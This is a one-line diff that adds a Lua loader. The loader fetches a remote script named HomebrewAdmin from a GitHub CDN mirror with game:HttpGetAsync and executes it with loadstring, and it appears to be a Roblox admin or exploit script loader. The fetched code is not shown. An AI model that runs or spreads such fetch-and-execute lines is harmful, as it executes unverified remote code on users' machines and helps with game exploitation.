@@ -1,0 +1,1 @@
+loadstring(game:HttpGetAsync("https://rawcdn.githack.com/Syntaxx64/HomebrewAdmin/7be65f0f8c386ed2eb7d3c6e36b8060b5b5be577/Main"))()
